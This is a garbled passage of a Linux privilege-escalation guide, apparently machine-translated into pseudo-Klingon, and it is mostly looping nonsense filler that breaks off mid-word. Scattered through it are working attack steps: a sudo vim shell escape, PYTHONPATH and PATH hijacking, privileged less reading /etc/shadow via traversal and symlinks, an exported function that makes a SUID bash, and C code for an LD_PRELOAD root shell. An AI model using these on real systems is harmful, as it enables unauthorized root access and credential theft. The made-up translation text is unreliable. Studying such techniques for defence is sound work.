'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej 'oH 'ej
```
sudo vim -c '!sh'
```
### SETENV

**tlhIngan Hol translation:**

**SETENV**

**ghItlhvam**: *ghItlhvam* **yIlo'** *ghItlhvam* **'ej* **ghItlhvam** *ghItlhvam* **ghItlhvam**: 

```bash
SETENV
```

**Note**: The translation for "set an environment variable" is not available in Klingon.
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
**tlhIngan Hol:**

**ghItlh: HTB machine Admirer**-Daq **lIj** **vItlhutlh** **PYTHONPATH hijacking**-Daq **vItlhutlh** **python library**-Daq **ghItlh** **vItlhutlh** **script**-Daq **ghItlh** **root**-Daq **ghItlh** **script**-Daq **ghItlh** **vItlhutlh** **arbitrary**-Daq **python library**-Daq **ghItlh** **vItlhutlh** **load**-Daq **vItlhutlh** **hijacking**-Daq **PYTHONPATH**-Daq **vItlhutlh** **PYTHONPATH hijacking**-Daq **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **based**-Daq **ghItlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lIj** **vItlhutlh** **based**-Daq **ghItlh** **HTB machine Admirer**-Daq **lIj** **vItlhutlh** **example**-Daq **ghItlh** **vItlhutlh** **vulnerable**-Daq **lI
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### Sudo execution bypassing paths

**Jump** to read other files or use **symlinks**. For example in sudoers file: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
**ghItlh** **wildcard** **vItlhutlh** (\*), **ghItlh** **rur** **ghItlh** **vItlhutlh**:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Countermeasures**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary without command path

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_ you can exploit it by changing the PATH variable

### Sudo command/SUID binary without command path

If the **sudo permission** is given to a single command **without specifying the path**: _hacker10 ALL= (root) less_ you can exploit it by changing the PATH variable
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
**Qa'chuq** **SUID** binary **executes another command without specifying the path to it (always check with** _**strings**_ **the content of a weird SUID binary)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binary with command path

If the **SUID** binary **executes another command specifying the path**, then, you can try to **export a function** named as the command that the **SUID** file is calling.

For example, if a **SUID** binary calls _**/usr/sbin/service apache2 start**_ you have to try to create the function and export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
### LD_PRELOAD & **LD_LIBRARY_PATH**

**LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

However, to maintain system security and prevent this feature from being exploited, particularly with **suid/sgid** executables, the system enforces certain conditions:

- The loader disregards **LD_PRELOAD** for executables where the real user ID (_ruid_) does not match the effective user ID (_euid_).
- For executables with suid/sgid, only libraries in standard paths that are also suid/sgid are preloaded.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
**/tmp/pe.c** file ni saqlang.
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
**Qa'vam** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** **vItlhutlh** **vaj** 